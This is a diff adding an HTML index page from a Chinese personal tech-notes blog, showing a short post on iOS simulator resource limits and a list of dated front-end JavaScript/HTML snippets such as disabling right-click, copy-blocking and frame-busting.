@@ -1,0 +1,1673 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+ <meta name="referrer" content="no-referrer"/>
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/nirvana/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/nirvana/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/nirvana/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/nirvana/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/nirvana/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.2/css/all.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lzhwweb.github.io","root":"/nirvana/","images":"/nirvana/images","scheme":"Gemini","version":"8.2.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+<meta name="description" content="个人学习笔记">
+<meta property="og:type" content="website">
+<meta property="og:title" content="涅槃快乐是金">
+<meta property="og:url" content="https://lzhwweb.github.io/nirvana/page/4/index.html">
+<meta property="og:site_name" content="涅槃快乐是金">
+<meta property="og:description" content="个人学习笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="nirvana">
+<meta property="article:tag" content="前端,javascript,node,git">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://lzhwweb.github.io/nirvana/page/4/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>涅槃快乐是金</title>
+  
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/nirvana/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">涅槃快乐是金</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/nirvana/" rel="section">首页</a></li>
+        <li class="menu-item menu-item-git"><a href="/nirvana/categories/git" rel="section">git</a></li>
+        <li class="menu-item menu-item-linux"><a href="/nirvana/categories/linux" rel="section">linux</a></li>
+        <li class="menu-item menu-item-android"><a href="/nirvana/categories/android" rel="section">android</a></li>
+        <li class="menu-item menu-item-随笔"><a href="/nirvana/categories/informal" rel="section">随笔</a></li>
+        <li class="menu-item menu-item-mac"><a href="/nirvana/categories/mac" rel="section">mac</a></li>
+        <li class="menu-item menu-item-react-native"><a href="/nirvana/categories/reactnative" rel="section">react-native</a></li>
+        <li class="menu-item menu-item-算法"><a href="/nirvana/categories/algorithm" rel="section">算法</a></li>
+        <li class="menu-item menu-item-读书笔记"><a href="/nirvana/categories/note" rel="section">读书笔记</a></li>
+        <li class="menu-item menu-item-开发工具"><a href="/nirvana/categories/tool" rel="section">开发工具</a></li>
+        <li class="menu-item menu-item-设计模式(ts)"><a href="/nirvana/categories/DesignPattern" rel="section">设计模式(TS)</a></li>
+        <li class="menu-item menu-item-前端"><a href="/nirvana/categories/javascript" rel="section">前端</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">nirvana</p>
+  <div class="site-description" itemprop="description">个人学习笔记</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/nirvana/archives">
+          <span class="site-state-item-count">178</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lzhwweb.github.io/nirvana/javascript/%E5%89%8D%E7%AB%AF/Unable-to-boot-device-due-to-insufficient-system-resources-/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/nirvana/images/avatar.gif">
+      <meta itemprop="name" content="nirvana">
+      <meta itemprop="description" content="个人学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="涅槃快乐是金">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/nirvana/javascript/%E5%89%8D%E7%AB%AF/Unable-to-boot-device-due-to-insufficient-system-resources-/" class="post-title-link" itemprop="url">Unable-to-boot-device-due-to-insufficient-system-resources-</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-11 21:12:40" itemprop="dateCreated datePublished" datetime="2021-03-11T21:12:40+08:00">2021-03-11</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-10 12:58:00" itemprop="dateModified" datetime="2021-03-10T12:58:00+08:00">2021-03-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/nirvana/categories/javascript/" itemprop="url" rel="index"><span itemprop="name">javascript</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>163</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>iOS模拟器当启动的模拟器数量过多时，会提示：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-e6efd02dc51166b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>该问题是模拟器的内存超出最大限额，可以通过修改内存大小来启动更多的模拟器</p>
+<p>sudo launchctl limit maxfiles 2000 unlimited<br><a target="_blank" rel="noopener" href="https://help.apple.com/simulator/mac/9.0/index.html#/dev8a5f2aa4e">https://help.apple.com/simulator/mac/9.0/index.html#/dev8a5f2aa4e</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lzhwweb.github.io/nirvana/javascript/%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E8%80%85%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BB%A3%E7%A0%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/nirvana/images/avatar.gif">
+      <meta itemprop="name" content="nirvana">
+      <meta itemprop="description" content="个人学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="涅槃快乐是金">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/nirvana/javascript/%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E8%80%85%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BB%A3%E7%A0%81/" class="post-title-link" itemprop="url">WEB前端开发者常用的代码</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-11 21:12:40" itemprop="dateCreated datePublished" datetime="2021-03-11T21:12:40+08:00">2021-03-11</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-10 12:58:00" itemprop="dateModified" datetime="2021-03-10T12:58:00+08:00">2021-03-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/nirvana/categories/javascript/" itemprop="url" rel="index"><span itemprop="name">javascript</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.7k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>1、将彻底屏蔽鼠标右键</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oncontextmenu&#x3D;&quot;window.event.returnValue&#x3D;false&quot; </span><br><span class="line">&lt;table border oncontextmenu&#x3D;return(false)&gt;&lt;td&gt;no&lt;&#x2F;table&gt; &#x2F;&#x2F;可用于 Table</span><br></pre></td></tr></table></figure>
+<p>2、取消选取、防止复制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onselectstart&#x3D;&quot;return false&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>3.JS不允许粘贴</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onpaste&#x3D;&quot;return false&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>4、JS防止复制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body oncopy&#x3D;&quot;return false;&quot; oncut&#x3D;&quot;return false;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>5、IE 地址栏前换成自己的图标</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;Shortcut Icon&quot; href&#x3D;&quot;favicon.ico&quot;&gt;</span><br><span class="line">&#x2F;&#x2F;在文件的根目录放进去这个图片，后缀修改成ico就可以了</span><br></pre></td></tr></table></figure>
+<p>6.可以在收藏夹中显示出你的图标<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;Bookmark&quot; href&#x3D;&quot;favicon.ico&quot;&gt;</span><br></pre></td></tr></table></figure><br>7.关闭输入法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input style&#x3D;&quot;ime-mode:disabled&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>8、永远都会带着框架</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot;&gt;&lt;!– if (window &#x3D;&#x3D; top)top.location.href &#x3D; “frames.htm&quot;; &#x2F;&#x2F;frames.htm 为框架网页 &#x2F;&#x2F; –&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>9、防止被人 frame</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT LANGUAGE&#x3D;JAVASCRIPT&gt;&lt;!– if (top.location !&#x3D; self.location)top.location&#x3D;self.location; &#x2F;&#x2F; –&gt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+<p>10、网页将不能被另存为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;noscript&gt;&lt;iframe src&#x3D;*.Html&gt;&lt;&#x2F;iframe&gt;&lt;&#x2F;noscript&gt;</span><br></pre></td></tr></table></figure>
+<p>11、查看网页源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;button value&#x3D;“查看网页源代码&quot;onclick&#x3D;&quot;window.location &#x3D; “view-source:&quot;+ “http:&#x2F;&#x2F;www.pconline.com.cn&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>12、光标是停在文本框文字的最后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;javascript&quot;&gt; </span><br><span class="line">function cc() &#123; </span><br><span class="line">      var e &#x3D; event.srcElement; </span><br><span class="line">      var r &#x3D;e.createTextRange();</span><br><span class="line">       r.moveStart(“character&quot;,e.value.length); </span><br><span class="line">      r.collapse(true); </span><br><span class="line">      r.select(); </span><br><span class="line">&#125;</span><br><span class="line"> &lt;&#x2F;script&gt; </span><br><span class="line">&lt;input type&#x3D;text name&#x3D;text1 value&#x3D;&quot;123″ onfocus&#x3D;&quot;cc()&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>13、判断上一页的来源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript: document.referrer</span><br></pre></td></tr></table></figure>
+<p>14、最小化、最大化、关闭窗口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object id&#x3D;hh1 classid&#x3D;&quot;clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11″&gt; &lt;param name&#x3D;&quot;Command&quot; value&#x3D;&quot;Minimize&quot;&gt;&lt;&#x2F;object&gt; &lt;object id&#x3D;hh2 classid&#x3D;&quot;clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11″&gt; &lt;param name&#x3D;&quot;Command&quot; value&#x3D;&quot;Maximize&quot;&gt;&lt;&#x2F;object&gt; &lt;OBJECT id&#x3D;hh3 classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11″&gt; &lt;PARAM NAME&#x3D;&quot;Command&quot; VALUE&#x3D;&quot;Close&quot;&gt;&lt;&#x2F;OBJECT&gt; &lt;input type&#x3D;button value&#x3D;最小化 onclick&#x3D;hh1.Click()&gt; &lt;input type&#x3D;button value&#x3D;最大化 onclick&#x3D;hh2.Click()&gt; &lt;input type&#x3D;button value&#x3D;关闭 onclick&#x3D;hh3.Click()&gt; 本例适用于 IE</span><br></pre></td></tr></table></figure>
+<p>15.屏蔽功能键 Shift,Alt,Ctrl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">function look()&#123;</span><br><span class="line">   if(event.shiftKey) </span><br><span class="line">  alert(“禁止按 Shift 键!&quot;); </span><br><span class="line">  &#x2F;&#x2F;可以换成 ALT CTRL</span><br><span class="line">&#125; </span><br><span class="line">document.onkeydown&#x3D;look;</span><br><span class="line"> &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>16、网页不会被缓存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV&#x3D;&quot;pragma&quot; CONTENT&#x3D;&quot;no-cache&quot;&gt; </span><br><span class="line">&lt;META HTTP-EQUIV&#x3D;&quot;Cache-Control&quot; CONTENT&#x3D;&quot;no-cache, must-revalidate&quot;&gt; </span><br><span class="line">&lt;META HTTP-EQUIV&#x3D;&quot;expires&quot; CONTENT&#x3D;&quot;Wed, 26 Feb 1997 08:21:57 GMT&quot;&gt; &#x2F;&#x2F;或者&lt;META HTTP-EQUIV&#x3D;&quot;expires&quot; CONTENT&#x3D;&quot;0″&gt;</span><br></pre></td></tr></table></figure>
+<p>17、怎样让表单没有凹凸感？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;text style&#x3D;&quot;border:1 solid #000000″&gt; 或 &lt;input type&#x3D;text style&#x3D;&quot;border-left:none; border-right:none; border-top:none; border-bottom: 1 solid #000000″&gt;&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure>
+<p>18.div span layer的区别？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;(division)用来定义大段的页面元素，会产生转行 &lt;span&gt;用来定义同一行内的元素，跟&lt;div&gt;的唯一区别是不产生转行 &lt;layer&gt;是 ns 的标记，ie 不支持，相当于&lt;div&gt;</span><br></pre></td></tr></table></figure>
+<p>19.让弹出窗口总是在最上面:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onblur&#x3D;&quot;this.focus();&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>20.不要滚动条?</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;让竖条没有: </span><br><span class="line">&lt;body style&#x3D;&quot;overflow:scroll;overflow-y:hidden&quot;&gt; &lt;&#x2F;body&gt; </span><br><span class="line">&#x2F;&#x2F;&#x2F;让横条没有: </span><br><span class="line">&lt;body style&#x3D;&quot;overflow:scroll;overflow-x:hidden&quot;&gt; &lt;&#x2F;body&gt; </span><br><span class="line">&#x2F;&#x2F;两个都去掉</span><br><span class="line"> &lt;body scroll&#x3D;&quot;no&quot;&gt; &lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
+<p>21.怎样去掉图片链接点击后，图片周围的虚线？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;#&quot; onFocus&#x3D;&quot;this.blur()&quot;&gt;&lt;img src&#x3D;&quot;logo.jpg&quot; border&#x3D;0&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+<p>22.电子邮件处理提交表单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name&#x3D;&quot;form1″ method&#x3D;&quot;post&quot; action&#x3D;&quot;mailto:****@***.com&quot; enctype&#x3D;&quot;text&#x2F;plain&quot;&gt; </span><br><span class="line">      &lt;input type&#x3D;submit&gt;</span><br><span class="line"> &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
+<p>23.在打开的子窗口刷新父窗口的代码里如何写？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.opener.location.reload()   </span><br></pre></td></tr></table></figure>
+<p> 24.如何设定打开页面的大小 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload&#x3D;&quot;top.resizeTo(300,200);&quot;&gt;</span><br><span class="line"> &#x2F;&#x2F;打开页面的位置</span><br><span class="line">&lt;body onload&#x3D;&quot;top.moveBy(300,200);&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>25.在页面中如何加入不是满铺的背景图片,拉动页面时背景图不动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt; body &#123;background-image:none; background-repeat:no-repeat; background-position:center;background-attachment: fixed&#125; &lt;&#x2F;STYLE&gt;</span><br></pre></td></tr></table></figure>
+<p>26、检查一段字符串是否全由数字组成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function checkNum(str)&#123;</span><br><span class="line">  return str.match(\&#x2F;D&#x2F;)&#x3D;&#x3D;null</span><br><span class="line">&#125;</span><br><span class="line">alert(checkNum(&quot;1232142141&quot;)) </span><br><span class="line">alert(checkNum(&quot;123214214a1&quot;))</span><br></pre></td></tr></table></figure>
+<p>27、获得一个窗口的大小</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.body.clientWidth; document.body.clientHeight</span><br></pre></td></tr></table></figure>
+<p>28、怎么判断是否是字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (&#x2F;[^&#x2F;x00-&#x2F;xff]&#x2F;g.test(s)) alert(“含有汉字&quot;); else alert(“全是字符&quot;);</span><br></pre></td></tr></table></figure>
+<p>29、TEXTAREA 自适应文字行数的多少</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea rows&#x3D;1 name&#x3D;s1 cols&#x3D;27 onpropertychange&#x3D;&quot;this.style.posHeight&#x3D;this.scrollHeight&quot;&gt; &lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure>
+<p>30、日期减去天数等于第二个日期</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;Javascript&gt; </span><br><span class="line">function cc(dd,dadd) &#123; </span><br><span class="line">    &#x2F;&#x2F;可以加上错误处理 </span><br><span class="line">    var a &#x3D; new Date(dd) </span><br><span class="line">    a &#x3D; a.valueOf() </span><br><span class="line">    a &#x3D; a - dadd * 24 * 60 * 60 * 1000 </span><br><span class="line">    a &#x3D; new Date(a)         </span><br><span class="line">    alert(a.getFullYear() + &quot;年&quot; + (a.getMonth() + 1) + &quot;月&quot; + a.getDate() + &quot;日&quot;)</span><br><span class="line"> &#125;  </span><br><span class="line">cc(“12&#x2F;23&#x2F;2002&quot;,2) </span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>31、ENTER 键可以让光标移到下一个输入框</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onkeydown&#x3D;&quot;if(event.keyCode&#x3D;&#x3D;13)event.keyCode&#x3D;9″&gt;</span><br></pre></td></tr></table></figure>
+<p>32、各种样式的光标</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">auto ：标准光标 default ：标准箭头</span><br><span class="line">hand ：手形光标</span><br><span class="line">wait ：等待光标</span><br><span class="line">text ：I 形光标</span><br><span class="line">vertical-text ：水平 I 形光标</span><br><span class="line">no-drop ：不可拖动光标</span><br><span class="line">not-allowed ：无效光标</span><br><span class="line">help ：?帮助光标</span><br><span class="line">all-scroll ：三角方向标</span><br><span class="line">move ：移动标</span><br><span class="line">crosshair ：十字标</span><br><span class="line">e-resize</span><br><span class="line">n-resize</span><br><span class="line">nw-resize</span><br><span class="line">w-resize</span><br><span class="line">s-resize</span><br><span class="line">se-resize</span><br><span class="line">sw-resize</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lzhwweb.github.io/nirvana/javascript/%E5%89%8D%E7%AB%AF/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%9AWhat--Why--How-/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/nirvana/images/avatar.gif">
+      <meta itemprop="name" content="nirvana">
+      <meta itemprop="description" content="个人学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="涅槃快乐是金">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
